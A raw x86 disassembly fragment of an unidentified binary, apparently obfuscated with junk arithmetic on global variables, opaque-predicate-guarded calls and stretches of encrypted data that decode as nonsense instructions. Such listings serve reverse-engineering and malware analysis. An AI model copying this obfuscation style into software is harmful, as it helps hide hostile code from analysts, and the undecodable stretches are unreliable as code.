  41976b:	pop    esp
  41976c:	push   ebp
  41976d:	data16 rcl BYTE PTR [ecx-0x28],1
  419771:	shl    edi,0xd0
  419774:	retf   0xd0bb
  419777:	pushf  
  419778:	aaa    
  419779:	xchg   esi,eax
  41977a:	rol    DWORD PTR [eax-0x598561a1],1
  419780:	jecxz  0x41976a
  419782:	jge    0x41973b
  419784:	mov    cl,0xe5
  419786:	inc    edi
  419787:	mov    ch,0x41
  419789:	jnp    0x419803
  41978b:	in     al,0xc0
  41978d:	mov    eax,DWORD PTR [esp+0x20]
  419791:	mov    ecx,DWORD PTR [esp+0x18]
  419795:	and    eax,ecx
  419797:	or     DWORD PTR ds:0x428269,0x3db4
  4197a1:	mov    ecx,DWORD PTR ds:0x422718
  4197a7:	sub    DWORD PTR ds:0x428285,0x773d
  4197b1:	add    eax,0x173c
  4197b6:	or     eax,ecx
  4197b8:	add    DWORD PTR ds:0x428281,0x68dc
  4197c2:	mov    ecx,DWORD PTR [esp+0x10]
  4197c6:	adc    DWORD PTR ds:0x42821d,0x3e88
  4197d0:	xor    ecx,eax
  4197d2:	xor    eax,0x422c
  4197d7:	mov    DWORD PTR [esp+0x10],ecx
  4197db:	and    DWORD PTR ds:0x428205,ecx
  4197e1:	mov    DWORD PTR [esp+0x18],0x3
  4197e9:	movzx  eax,WORD PTR ds:0x4281ad
  4197f0:	and    DWORD PTR ds:0x4282b5,eax
  4197f6:	mov    DWORD PTR [esp+0x20],0x3bd0
  4197fe:	sub    DWORD PTR ds:0x4282b9,0x3e48
  419808:	mov    eax,DWORD PTR [esp+0x20]
  41980c:	sbb    ecx,DWORD PTR ds:0x4282c5
  419812:	mov    ecx,DWORD PTR [esp+0x18]
  419816:	xor    eax,0x2445
  41981b:	xor    edx,edx
  41981d:	div    ecx
  41981f:	adc    DWORD PTR ds:0x4282bd,0x291c
  419829:	mov    ecx,DWORD PTR [esp+0x10]
  41982d:	and    DWORD PTR ds:0x4281fd,0x428269
  419837:	xor    eax,0x653c
  41983c:	and    DWORD PTR ds:0x4281ad,0x107c
  419846:	add    eax,0x41da
  41984b:	mov    DWORD PTR ds:0x428225,0x6541
  419855:	cmp    ecx,eax
  419857:	mov    DWORD PTR ds:0x4282bd,0x1706
  419861:	jne    0x419892
  419867:	not    DWORD PTR ds:0x4281a5
  41986d:	mov    DWORD PTR [esp+0x20],0x1
  419875:	mov    DWORD PTR [esp+0x20],0x1a7a
  41987d:	mov    DWORD PTR [esp+0x20],0x32f1
  419885:	mov    DWORD PTR [esp+0x20],0x4dc9
  41988d:	jmp    0x4198af
  419892:	push   ebx
  419893:	adc    DWORD PTR ds:0x428221,0x4282c1
  41989d:	push   ebx
  41989e:	or     DWORD PTR ds:0x4282cd,0x4282c9
  4198a8:	push   ebx
  4198a9:	call   DWORD PTR ds:0x428ac8
  4198af:	or     DWORD PTR ds:0x42819d,0x428231
  4198b9:	dec    esi
  4198ba:	mov    DWORD PTR ds:0x428269,0x3546
  4198c4:	jne    0x4193e2
  4198ca:	mov    DWORD PTR [esp+0x58],0xcb89b676
  4198d2:	cmp    DWORD PTR ds:0x428279,0x0
  4198d9:	mov    esi,0x66d7
  4198de:	mov    esi,DWORD PTR ds:0x4281fd
  4198e4:	jmp    0x41993b
  4198e9:	mov    DWORD PTR ds:0x4282c5,ecx
  4198ef:	mov    DWORD PTR ds:0x428199,0x4135
  4198f9:	cmp    DWORD PTR ds:0x428279,0x0
  419900:	jle    0x41991d
  419906:	push   0x5471
  41990b:	call   DWORD PTR ds:0x4289fc
  419911:	or     DWORD PTR ds:0x4282b5,edi
  419917:	xor    DWORD PTR ds:0x4282c5,ecx
  41991d:	and    esi,0x29ba
  419923:	or     esi,DWORD PTR ds:0x42826d
  419929:	adc    DWORD PTR ds:0x4282c5,edi
  41992f:	mov    esi,DWORD PTR ds:0x4281a5
  419935:	sub    DWORD PTR ds:0x4282c1,esi
  41993b:	mov    esi,0x9d2b8af8
  419940:	sbb    DWORD PTR ds:0x4282bd,0x4281ad
  41994a:	mov    DWORD PTR [esp+0x5c],esi
  41994e:	add    DWORD PTR ds:0x428241,0x4282c1
  419958:	mov    DWORD PTR [esp+0x60],0xcb89b672
  419960:	mov    DWORD PTR [esp+0x64],esi
  419964:	and    DWORD PTR ds:0x4282c5,0x835
  41996e:	call   0x406cc4
  419973:	lea    eax,[esp+0x30]
  419977:	mov    DWORD PTR [esp+0x20],eax
  41997b:	mov    edx,DWORD PTR ds:0x4281b5
  419981:	xor    ecx,ecx
  419983:	add    ecx,DWORD PTR ds:0x4282a1
  419989:	sub    edx,ecx
  41998b:	imul   edx,DWORD PTR [edx+ecx*1]
  41998f:	lea    eax,[esp+0x40]
  419993:	or     DWORD PTR ds:0x4281a9,ecx
  419999:	mov    DWORD PTR [esp+0x18],eax
  41999d:	cmp    DWORD PTR ds:0x428285,0x0
  4199a4:	mov    DWORD PTR ds:0x42822d,ecx
  4199aa:	movzx  edx,BYTE PTR ds:0x42821d
  4199b1:	mov    edi,DWORD PTR ds:0x42822d
  4199b7:	jmp    0x419a15
  4199bc:	mov    DWORD PTR ds:0x42822d,edx
  4199c2:	cmp    DWORD PTR ds:0x428285,0x0
  4199c9:	jae    0x4199f5
  4199cf:	push   DWORD PTR [ebp-0x10]
  4199d2:	call   DWORD PTR ds:0x428a88
  4199d8:	movzx  ecx,WORD PTR ds:0x42820d
  4199df:	sbb    ecx,DWORD PTR ds:0x4282bd
  4199e5:	mov    DWORD PTR ds:0x42820d,ecx
  4199eb:	dec    DWORD PTR ds:0x42820d
  4199f1:	neg    edi
  4199f3:	adc    ecx,edx
  4199f5:	sbb    edx,DWORD PTR ds:0x42822d
  4199fb:	xor    edi,edi
  4199fd:	xor    edi,DWORD PTR ds:0x4281ad
  419a03:	xor    DWORD PTR ds:0x4281b1,edi
  419a09:	sub    DWORD PTR ds:0x4282b9,edi
  419a0f:	dec    DWORD PTR ds:0x428281
  419a15:	mov    eax,ds:0x4222a8
  419a1a:	mov    eax,DWORD PTR [eax+0x1d8]
  419a20:	and    edx,DWORD PTR ds:0x428215
  419a26:	mov    eax,DWORD PTR [eax]
  419a28:	mov    ecx,eax
  419a2a:	cmp    DWORD PTR ds:0x428219,0x0
  419a31:	mov    edx,0xed7
  419a36:	mov    edi,0x369b
  419a3b:	movzx  edx,BYTE PTR ds:0x428211
  419a42:	mov    DWORD PTR ds:0x428209,edx
  419a48:	jmp    0x419aa9
  419a4d:	not    DWORD PTR ds:0x4281fd
  419a53:	mov    DWORD PTR ds:0x4281ad,0x1e6e
  419a5d:	cmp    DWORD PTR ds:0x428219,0x0
  419a64:	jle    0x419a97
  419a6a:	push   0x5887
  419a6f:	push   0x3493
  419a74:	push   0x5d89
  419a79:	push   DWORD PTR [ebp-0x28]
  419a7c:	push   DWORD PTR [ebp-0x28]
  419a7f:	call   DWORD PTR ds:0x428a00
  419a85:	and    edi,edi
  419a87:	adc    DWORD PTR ds:0x428269,0x2ffd
  419a91:	add    DWORD PTR ds:0x428241,ebx
  419a97:	sbb    edi,DWORD PTR ds:0x428199
  419a9d:	add    DWORD PTR ds:0x4282b1,ebx
  419aa3:	dec    DWORD PTR ds:0x42819d
  419aa9:	xor    ecx,0xa6069caf
  419aaf:	jmp    0x419d45
  419ab4:	pop    ecx
  419ab5:	sti    
  419ab6:	or     BYTE PTR [eax],bh
  419ab8:	cwde   
  419ab9:	cmp    DWORD PTR [ecx-0x65],edi
  419abc:	cdq    
  419abd:	xchg   esi,eax
  419abe:	pop    ecx
  419abf:	inc    ebp
  419ac0:	jbe    0x419b02
  419ac2:	cmp    DWORD PTR [ebx],0xbbc130d1
  419ac8:	test   al,0xbf
  419aca:	mov    ebx,0xc4f969bb
  419acf:	or     DWORD PTR ds:0xb9b1d4c3,ecx
  419ad5:	pop    esi
  419ad6:	pop    ebp
  419ad7:	and    edx,ebp
  419ad9:	imul   eax,DWORD PTR [edi],0x424cd185
  419adf:	adc    edi,esp
  419ae1:	mov    eax,ds:0x8637f165
  419ae6:	xor    DWORD PTR [di+0x5d],edx
  419aea:	cwde   
  419aeb:	fsubr  QWORD PTR [edi+0x39]
  419aee:	jns    0x419a95
  419af0:	fwait
  419af1:	jecxz  0x419a82
  419af3:	std    
  419af4:	mov    eax,0xb595bfa8
  419af9:	ins    BYTE PTR es:[edi],dx
  419afa:	test   al,0x70
  419afc:	leave  
  419afd:	xchg   ecx,eax
  419afe:	(bad)  
  419aff:	xor    cl,BYTE PTR [esi]
  419b01:	popa   
  419b02:	js     0x419b03
  419b04:	xor    BYTE PTR [edx+0x24],al
  419b07:	call   0x3ef9:0xb0fab903
  419b0e:	aas    
  419b0f:	out    0xf0,eax
  419b11:	jmp    0x2f5351e3
  419b16:	jge    0x419aae
  419b18:	and    al,0xa8
  419b1a:	or     ax,0xd57f
  419b1e:	mov    ebp,0x4592e251
  419b23:	mov    BYTE PTR [ebp-0x56411635],dl
  419b29:	xor    eax,0x61909757
  419b2e:	dec    ebp
  419b2f:	ret    0x7139
  419b32:	pop    ecx
  419b33:	or     esp,ebp
  419b35:	pcmpeqw mm3,QWORD PTR [edx]
  419b38:	jge    0x419b24
  419b3a:	sub    eax,0x86917e7d
  419b3f:	mov    cl,0x8a
  419b41:	jp     0x419b03
  419b43:	jmp    0xbe0ddb1f
  419b48:	pop    ecx
  419b49:	mov    eax,0x3ab32a2e
  419b4e:	push   edx
  419b4f:	inc    ebp
  419b50:	sbb    DWORD PTR [edi-0x30],edi
  419b53:	mov    esi,0xba576a8d
  419b58:	ret    0x3860
  419b5b:	xor    al,0xc
  419b5d:	jp     0x419b41
  419b5f:	pop    ecx
  419b60:	std    
  419b61:	push   ecx
  419b62:	lods   al,BYTE PTR cs:[esi]
  419b64:	adc    eax,0xac6405cc
  419b69:	stos   BYTE PTR es:[edi],al
  419b6a:	enter  0xc012,0x3f
  419b6e:	mov    BYTE PTR [edi],bl
  419b70:	leave  
  419b71:	mov    edi,0x653f4eca
  419b76:	(bad)  
  419b78:	xchg   esp,eax
  419b79:	and    ah,BYTE PTR [ecx]
  419b7b:	jp     0x419b69
  419b7d:	hlt    
  419b7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b7f:	mov    dl,0x6d
  419b81:	mov    edx,0xb29f70e
  419b86:	or     eax,0x15e55e8a
  419b8b:	cwde   
  419b8c:	fwait
  419b8d:	sbb    DWORD PTR [eax],ecx
  419b8f:	mov    ebp,0x6ba0cf16
  419b94:	pop    edi
  419b95:	mov    bh,0x23
  419b97:	fmul   DWORD PTR [edi-0x306b5a6e]
  419b9d:	in     al,0xe
  419b9f:	sub    DWORD PTR [edx],edi
  419ba1:	rol    ah,0xec
  419ba4:	in     eax,dx
  419ba5:	xlat   BYTE PTR ds:[ebx]
  419ba6:	mov    ds:0x3921ede3,eax
  419bab:	push   ecx
  419bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bad:	push   ebx
  419bae:	xor    DWORD PTR [ecx],esi
  419bb0:	test   BYTE PTR ds:0xae9640e2,0x0
  419bb7:	cmp    DWORD PTR [ecx+0x44],edi
  419bba:	and    ebx,DWORD PTR [ebp-0x1c]
  419bbd:	mov    eax,ds:0x1cc9cdb4
  419bc2:	pop    ds
  419bc3:	dec    ecx
  419bc4:	in     al,dx
  419bc5:	mul    DWORD PTR ds:0x5b6496fb
  419bcb:	push   0xafd12660
  419bd0:	xor    ah,al
  419bd2:	into   
  419bd3:	rol    BYTE PTR [ebx+0x18dc6a19],cl
  419bd9:	pop    ss
  419bda:	xor    ah,BYTE PTR [ebx-0x3360510c]
  419be0:	imul   ebp,edi,0xd009832c
  419be6:	mov    edi,0x468ccc51
  419beb:	scas   eax,DWORD PTR es:[edi]
  419bec:	add    edx,DWORD PTR [esi+0x7b]
  419bef:	jnp    0x419bf8
  419bf1:	iret   
  419bf2:	mov    bh,0x55
  419bf4:	adc    DWORD PTR [edi+esi*4+0x8],ecx
  419bf8:	adc    eax,0xb5df6176
  419bfd:	or     BYTE PTR [edi],bl
  419bff:	cmp    esi,DWORD PTR [edx+0x590f0005]
  419c05:	and    ecx,DWORD PTR [ecx-0x6b]
  419c08:	nop
  419c09:	xor    al,0x34
  419c0b:	mov    bh,0x47
  419c0d:	fdiv   QWORD PTR [eax]
  419c0f:	fwait
  419c10:	or     bl,BYTE PTR [eax-0x13]
  419c13:	dec    esi
  419c14:	mov    ebp,0x1609a65d
  419c19:	repz sub ch,BYTE PTR [eax-0x27]
  419c1d:	mov    ecx,0x3d382998
  419c22:	fs retf 
  419c24:	mov    BYTE PTR [ebp-0x270816f5],cl
  419c2a:	jb     0x419c64
  419c2c:	out    dx,al
  419c2d:	hlt    
  419c2e:	mov    cl,0xe9
  419c30:	add    ebp,eax
  419c32:	mov    ds:0xc0a9e28d,al
  419c37:	sub    eax,0x56e824a0
  419c3c:	into   
  419c3d:	dec    eax
  419c3e:	outs   dx,BYTE PTR ds:[esi]
  419c3f:	cmp    edx,edi
  419c41:	cwde   
  419c42:	fwait
  419c43:	push   edi
  419c44:	and    ebx,esi
  419c46:	std    
  419c47:	cs jge 0x419c09
  419c4a:	sbb    bh,BYTE PTR [eax-0x275219bc]
  419c50:	sbb    eax,0x61d0144d
  419c55:	aad    0xfe
  419c57:	pushf  
  419c58:	das    
  419c59:	or     ecx,DWORD PTR [edx]
  419c5b:	(bad)  
  419c5c:	in     eax,0x81
  419c5e:	fwait
  419c5f:	inc    ecx
  419c60:	cmp    BYTE PTR [esi],ah
  419c62:	jecxz  0x419c4f
  419c64:	and    eax,0x6f10f66c
  419c69:	dec    edx
  419c6a:	and    bl,BYTE PTR [bx+di]
  419c6d:	pop    esi
  419c6e:	mov    al,ds:0xf48e8595
  419c73:	jb     0x419c14
  419c75:	xor    eax,0x472e90c0
  419c7a:	arpl   WORD PTR [ebp-0x6724dc56],si
  419c80:	call   0x8428:0x74c9abf1
  419c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c88:	mov    BYTE PTR [eax-0x6c6cc587],bl
  419c8e:	or     ebx,DWORD PTR [eax]
  419c90:	jmp    0x1921:0x8bde17d
  419c97:	leave  
  419c98:	rcl    BYTE PTR [esi+edi*1-0x56e50513],0xdf
  419ca0:	lds    ecx,FWORD PTR ds:[ecx]
  419ca3:	pop    ebp
  419ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ca5:	xchg   edx,eax
  419ca6:	xchg   ecx,eax
  419ca7:	repnz in al,0x8d
  419caa:	shl    dl,0xd2
  419cad:	mov    BYTE PTR [eax+0x17],ah
  419cb0:	icebp  
  419cb1:	arpl   WORD PTR [ecx-0xa4c4ae9],ax
  419cb7:	push   0x2b
  419cb9:	imul   ebx,ecx,0xd7c7b67e
  419cbf:	aaa    
  419cc0:	pop    ecx
  419cc1:	inc    esi
  419cc2:	les    ecx,FWORD PTR [esi-0x39]
  419cc5:	retf   0x9b40
  419cc8:	mov    edx,0xb80005ac
  419ccd:	add    DWORD PTR [edi-0xa],ebx
  419cd0:	inc    edi
  419cd1:	mov    ecx,0x864d5c9e
  419cd6:	mov    edi,0x8f449d55
  419cdb:	fsubr  QWORD PTR [edx-0x4d7fccf8]
  419ce1:	jnp    0x419cfa
  419ce3:	lahf   
  419ce4:	(bad)  [esi+0x7c]
  419ce7:	(bad)  
  419ce8:	jns    0x419c6f
  419cea:	lods   eax,DWORD PTR ds:[esi]
  419ceb:	mov    esp,0x13dd14d3
  419cf0:	call   0x1369d152
  419cf5:	scas   eax,DWORD PTR es:[edi]
  419cf6:	pop    esp
  419cf7:	mov    WORD PTR [edx+0x15],?
  419cfa:	xlat   BYTE PTR ds:[ebx]
  419cfb:	lods   al,BYTE PTR ds:[esi]
  419cfc:	pop    es
  419cfd:	loope  0x419ca3
  419cff:	std    
  419d00:	mov    ah,0x40
  419d02:	adc    BYTE PTR [eax-0x4530c039],cl
  419d08:	mov    WORD PTR [ecx+0x6f1ab21e],es
  419d0e:	(bad)  
  419d0f:	shr    BYTE PTR [esi+0xc],0xba
  419d13:	ds leave 
  419d15:	loope  0x419d3f
  419d17:	push   es
  419d18:	and    ah,bl
  419d1a:	lahf   
  419d1b:	add    al,0x15
  419d1d:	pop    ebp
  419d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d1f:	push   es
  419d20:	test   BYTE PTR [esi],0x0
  419d23:	lds    ecx,FWORD PTR [eax+edx*4-0x18]
  419d27:	mov    dh,BYTE PTR [edi]
  419d29:	pop    edx
  419d2a:	pusha  
  419d2b:	(bad)  
  419d2c:	jbe    0x419d22
  419d2e:	sahf   
  419d2f:	jne    0x419d65
  419d31:	sbb    eax,0x5f4c675e
  419d36:	ss push eax
  419d38:	mov    dl,cl
  419d3a:	jmp    ebx
  419d3c:	mov    edx,DWORD PTR [edx+0x45]
  419d3f:	bound  edx,QWORD PTR [eax-0x15]
  419d42:	addr16 out 0x83,eax
  419d45:	xor    eax,0xfffffffe
  419d48:	sub    edi,DWORD PTR ds:0x428209
  419d4e:	shl    eax,0x1e
  419d51:	cmp    DWORD PTR ds:0x428275,0x0
  419d58:	not    edi
  419d5a:	mov    DWORD PTR ds:0x4282b1,0x4b3a
  419d64:	jmp    0x419e6e
  419d69:	mov    DWORD PTR ds:0x428239,0x3bc0
  419d73:	mov    DWORD PTR ds:0x4282d1,0x79a2
  419d7d:	cmp    DWORD PTR ds:0x428275,0x0
  419d84:	ja     0x419db3
  419d8a:	push   0x3216
  419d8f:	call   DWORD PTR ds:0x428a04
  419d95:	adc    edi,edx
  419d97:	xor    edi,edi
  419d99:	xor    edi,DWORD PTR ds:0x42826d
  419d9f:	or     DWORD PTR ds:0x42819d,edi
  419da5:	xor    edx,edx
  419da7:	or     edx,DWORD PTR ds:0x4282c9
  419dad:	xor    DWORD PTR ds:0x4282b9,edx
  419db3:	inc    edi
  419db4:	not    edx
  419db6:	xor    edi,0x602d
  419dbc:	cmp    DWORD PTR ds:0x428221,0x0
  419dc3:	mov    DWORD PTR ds:0x42827d,0x48b1
  419dcd:	mov    edx,0x3dd9
  419dd2:	not    DWORD PTR ds:0x428239
  419dd8:	jmp    0x419e6e
  419ddd:	mov    DWORD PTR ds:0x4281a9,0x4fc7
  419de7:	mov    DWORD PTR ds:0x428191,0x25dc
  419df1:	cmp    DWORD PTR ds:0x428221,0x0
  419df8:	jne    0x419e37
  419dfe:	push   0x4280cb
  419e03:	push   0x4433
  419e08:	call   DWORD PTR ds:0x428a08
  419e0e:	or     edi,DWORD PTR ds:0x428215
  419e14:	movzx  edx,BYTE PTR ds:0x42822d
  419e1b:	add    edx,DWORD PTR ds:0x4281fd
  419e21:	mov    DWORD PTR ds:0x42822d,edx
  419e27:	add    edx,0x66e4
  419e2d:	xor    DWORD PTR ds:0x42821d,0x2f5c
  419e37:	add    edi,DWORD PTR ds:0x4282c5
  419e3d:	xor    edi,edi
  419e3f:	or     edi,DWORD PTR ds:0x428221
  419e45:	sub    DWORD PTR ds:0x428269,edi
  419e4b:	sub    edx,DWORD PTR ds:0x428225
  419e51:	or     DWORD PTR ds:0x428235,0x438c
  419e5b:	mov    edx,DWORD PTR ds:0x428261
  419e61:	xor    edi,edi
  419e63:	xor    edi,DWORD PTR ds:0x4282e1
  419e69:	sub    edx,edi
  419e6b:	sub    edx,DWORD PTR [edx+edi*1]
  419e6e:	shr    ecx,0x2
  419e71:	cmp    DWORD PTR ds:0x4281a9,0x0
  419e78:	mov    DWORD PTR ds:0x42821d,0x3baf
  419e82:	mov    DWORD PTR ds:0x428235,0x712b
  419e8c:	jmp    0x419eda
  419e91:	mov    DWORD PTR ds:0x428205,0x4cf0
  419e9b:	mov    DWORD PTR ds:0x4282c1,0x151c
  419ea5:	cmp    DWORD PTR ds:0x4281a9,0x0
  419eac:	jae    0x419ece
  419eb2:	push   0x428001
  419eb7:	push   0x428018
  419ebc:	call   DWORD PTR ds:0x428a8c
  419ec2:	sub    DWORD PTR ds:0x4281a1,0x5699
  419ecc:	xor    edx,edx
  419ece:	adc    edi,DWORD PTR ds:0x428275
  419ed4:	xor    edi,0x6260
  419eda:	or     ecx,eax
  419edc:	mov    eax,DWORD PTR [esp+0x18]
  419ee0:	or     edx,edx
  419ee2:	mov    DWORD PTR [eax],ecx
  419ee4:	mov    DWORD PTR ds:0x428289,0x2db
  419eee:	mov    edi,0xcb89b666
  419ef3:	or     DWORD PTR ds:0x42820d,ecx
  419ef9:	mov    DWORD PTR [esp+0x68],edi
  419efd:	cmp    DWORD PTR ds:0x42823d,0x0
  419f04:	mov    DWORD PTR ds:0x428231,edx
  419f0a:	mov    ecx,0x588b
  419f0f:	jmp    0x419f70
  419f14:	not    edx
  419f16:	cmp    DWORD PTR ds:0x42823d,0x0
  419f1d:	ja     0x419f52
  419f23:	push   DWORD PTR [ebp-0x20]
  419f26:	push   DWORD PTR [ebp-0x1c]
  419f29:	call   DWORD PTR ds:0x428a0c
  419f2f:	xor    ecx,ecx
  419f31:	xor    ecx,DWORD PTR ds:0x428259
  419f37:	mov    edx,DWORD PTR ds:0x4282a1
  419f3d:	sub    edx,ecx
  419f3f:	sub    ecx,DWORD PTR [ecx+edx*1]
  419f42:	adc    edx,DWORD PTR ds:0x428195
  419f48:	mov    DWORD PTR ds:0x4281ad,0x2322
  419f52:	sbb    edx,0x467d
  419f58:	xor    edx,DWORD PTR ds:0x4282c5
  419f5e:	sub    DWORD PTR ds:0x428241,0x4e30
  419f68:	and    ecx,DWORD PTR ds:0x428209
  419f6e:	adc    eax,edx
  419f70:	mov    DWORD PTR [esp+0x6c],esi
  419f74:	adc    edx,DWORD PTR ds:0x4281ad
  419f7a:	mov    eax,DWORD PTR [esp+0x68]
  419f7e:	and    DWORD PTR ds:0x4281a9,0x6419
  419f88:	mov    ecx,DWORD PTR [esp+0x6c]
  419f8c:	cmp    DWORD PTR ds:0x428219,0x0
  419f93:	mov    DWORD PTR ds:0x428235,0x2164
  419f9d:	mov    edx,DWORD PTR ds:0x428195
  419fa3:	mov    DWORD PTR ds:0x428191,0x38e8
  419fad:	jmp    0x41a00c
  419fb2:	mov    DWORD PTR ds:0x428285,0x23b2
  419fbc:	cmp    DWORD PTR ds:0x428219,0x0
  419fc3:	jg     0x419fee
  419fc9:	push   DWORD PTR [ebp-0x10]
  419fcc:	call   DWORD PTR ds:0x428a10
  419fd2:	xor    edx,0x5996
  419fd8:	xor    DWORD PTR ds:0x4282b1,0x4282cd
  419fe2:	mov    edx,DWORD PTR ds:0x42827d
  419fe8:	or     DWORD PTR ds:0x428231,edx
  419fee:	xor    DWORD PTR ds:0x428281,0x672e
  419ff8:	adc    DWORD PTR ds:0x4281a1,0x14f4
  41a002:	xor    DWORD PTR ds:0x42823d,0x40e1
  41a00c:	shrd   eax,ecx,0x2
  41a010:	cmp    DWORD PTR ds:0x428279,0x0
  41a017:	mov    DWORD PTR ds:0x428221,edx
  41a01d:	mov    DWORD PTR ds:0x42819d,edi
  41a023:	mov    edx,0x2a3c
  41a028:	jmp    0x41a09b
  41a02d:	mov    DWORD PTR ds:0x42827d,ecx
  41a033:	mov    DWORD PTR ds:0x4282b9,0x15c3
  41a03d:	cmp    DWORD PTR ds:0x428279,0x0
  41a044:	jge    0x41a085
  41a04a:	push   0x4507
  41a04f:	push   0x42821d
  41a054:	push   DWORD PTR [ebp-0x24]
  41a057:	call   DWORD PTR ds:0x428a14
  41a05d:	or     edx,0x6e93
  41a063:	add    edx,0x1f02
  41a069:	mov    DWORD PTR ds:0x428235,0x6328
  41a073:	mov    edx,DWORD PTR ds:0x428191
  41a079:	add    edx,DWORD PTR ds:0x428205
  41a07f:	mov    DWORD PTR ds:0x428191,edx
  41a085:	sbb    edx,DWORD PTR ds:0x428269
  41a08b:	sub    DWORD PTR ds:0x428271,0x7d8d
  41a095:	and    edx,DWORD PTR ds:0x428225
  41a09b:	shr    ecx,0x2
  41a09e:	and    ecx,edx
  41a0a0:	mov    ecx,DWORD PTR [esp+0x68]
  41a0a4:	sbb    DWORD PTR ds:0x428219,0x636f
  41a0ae:	mov    edx,DWORD PTR [esp+0x6c]
  41a0b2:	xor    DWORD PTR ds:0x42822d,0x7ee2
  41a0bc:	xor    eax,0x32e26d9d
  41a0c1:	xor    edx,edx
  41a0c3:	dec    DWORD PTR ds:0x428275
  41a0c9:	or     edx,eax
  41a0cb:	mov    eax,ds:0x4222a8
  41a0d0:	adc    DWORD PTR ds:0x428279,0x428285
  41a0da:	push   edx
  41a0db:	push   DWORD PTR [eax+0x19c]
  41a0e1:	mov    DWORD PTR ds:0x428215,0xd08
  41a0eb:	lea    eax,[esp+0x50]
  41a0ef:	push   eax
  41a0f0:	and    DWORD PTR ds:0x428281,0x428191
  41a0fa:	shl    ecx,0x1e
  41a0fd:	mov    DWORD PTR ds:0x4282b5,0x7a7d
  41a107:	call   0x41182a
  41a10c:	lea    eax,[ebp+0x10]
  41a10f:	push   eax
  41a110:	or     DWORD PTR ds:0x428279,0x521
  41a11a:	mov    DWORD PTR [esp+0x1c],edi
  41a11e:	add    DWORD PTR ds:0x428191,0x428211
  41a128:	mov    DWORD PTR [esp+0x20],esi
  41a12c:	lea    eax,[ebp+0xc]
  41a12f:	push   eax
  41a130:	mov    DWORD PTR ds:0x428241,0x5e88
  41a13a:	mov    DWORD PTR [esp+0x20],edi
  41a13e:	or     DWORD PTR ds:0x42821d,0x428275
  41a148:	lea    eax,[ebp+0x8]
  41a14b:	sbb    DWORD PTR ds:0x4282bd,0x428241
  41a155:	mov    DWORD PTR [esp+0x24],esi
  41a159:	adc    DWORD PTR ds:0x428235,0x428205
  41a163:	mov    DWORD PTR [esp+0x20],edi
  41a167:	and    DWORD PTR ds:0x428239,0x3ce9
  41a171:	mov    DWORD PTR [esp+0x24],esi
  41a175:	push   eax
  41a176:	call   0x4084d5
  41a17b:	push   0x4
  41a17d:	push   0x42212c
  41a182:	push   DWORD PTR [esp+0x28]
  41a186:	call   0x41182a
  41a18b:	sub    ecx,DWORD PTR ds:0x428209
  41a191:	mov    eax,DWORD PTR [esp+0x20]
  41a195:	cmp    DWORD PTR ds:0x4281a9,0x0
  41a19c:	mov    DWORD PTR ds:0x428201,ebx
  41a1a2:	mov    DWORD PTR ds:0x42823d,0x7a7b
  41a1ac:	mov    ecx,DWORD PTR ds:0x42827d
  41a1b2:	jmp    0x41a20a
  41a1b7:	mov    DWORD PTR ds:0x4282c5,0x5101
  41a1c1:	mov    DWORD PTR ds:0x4281fd,ecx
  41a1c7:	cmp    DWORD PTR ds:0x4281a9,0x0
  41a1ce:	jae    0x41a202
  41a1d4:	push   DWORD PTR [ebp-0x1c]
  41a1d7:	push   0x6eb9
  41a1dc:	push   DWORD PTR [ebp-0x24]
  41a1df:	call   DWORD PTR ds:0x428a18
  41a1e5:	movzx  ecx,BYTE PTR ds:0x428281
  41a1ec:	adc    DWORD PTR ds:0x4281b1,ecx
  41a1f2:	adc    DWORD PTR ds:0x4281fd,0x7c79
  41a1fc:	adc    DWORD PTR ds:0x428275,ebx
  41a202:	neg    ecx
  41a204:	sub    ecx,DWORD PTR ds:0x428191
  41a20a:	mov    ecx,DWORD PTR [esp+0x20]
  41a20e:	mov    eax,DWORD PTR [eax]
  41a210:	mov    ecx,DWORD PTR [ecx]
  41a212:	and    DWORD PTR ds:0x42823d,0x38aa
  41a21c:	shr    eax,0x1e
  41a21f:	sub    DWORD PTR ds:0x428279,0x77b9
  41a229:	shl    ecx,0x2
  41a22c:	or     eax,ecx
  41a22e:	mov    ecx,DWORD PTR [esp+0x20]
  41a232:	add    DWORD PTR ds:0x4281b1,0x2572
  41a23c:	xor    eax,0xa6069cae
  41a241:	sub    DWORD PTR ds:0x4281a1,0x63d5
  41a24b:	mov    DWORD PTR [ecx],eax
  41a24d:	adc    DWORD PTR ds:0x428215,ebx
  41a253:	lea    eax,[esp+0x2c]
  41a257:	cmp    DWORD PTR ds:0x4281a9,0x0
  41a25e:	not    DWORD PTR ds:0x4282c9
  41a264:	movzx  ecx,BYTE PTR ds:0x428289
  41a26b:	mov    DWORD PTR ds:0x428209,ebx
  41a271:	not    ecx
  41a273:	jmp    0x41a2da
  41a278:	mov    ecx,0x720c
  41a27d:	cmp    DWORD PTR ds:0x4281a9,0x0
  41a284:	jne    0x41a2ad
  41a28a:	push   0x14aa
  41a28f:	push   0x4068
  41a294:	call   DWORD PTR ds:0x428a1c
  41a29a:	movzx  ecx,WORD PTR ds:0x4282b1
  41a2a1:	add    DWORD PTR ds:0x428191,ecx
  41a2a7:	xor    ecx,0x3053
  41a2ad:	mov    ecx,DWORD PTR ds:0x428221
  41a2b3:	sub    ecx,DWORD PTR ds:0x42823d
  41a2b9:	mov    DWORD PTR ds:0x428221,ecx
  41a2bf:	neg    ecx
  41a2c1:	xor    ecx,DWORD PTR ds:0x428221
  41a2c7:	movzx  ecx,WORD PTR ds:0x42820d
  41a2ce:	adc    ecx,DWORD PTR ds:0x4282c5
  41a2d4:	mov    DWORD PTR ds:0x42820d,ecx
  41a2da:	mov    DWORD PTR [esp+0x50],eax
  41a2de:	lea    eax,[esp+0x50]
  41a2e2:	xor    ecx,DWORD PTR ds:0x42820d
  41a2e8:	mov    DWORD PTR [esp+0x54],eax
  41a2ec:	mov    ecx,DWORD PTR ds:0x428291
  41a2f2:	mov    eax,ds:0x4282ad
  41a2f7:	sub    eax,ecx
  41a2f9:	and    ecx,DWORD PTR [ecx+eax*1]
  41a2fc:	mov    eax,DWORD PTR [esp+0x2c]
  41a300:	movzx  ecx,WORD PTR ds:0x428219
  41a307:	adc    ecx,DWORD PTR ds:0x42821d
  41a30d:	mov    DWORD PTR ds:0x428219,ecx
  41a313:	sub    DWORD PTR [esp+0x2c],eax
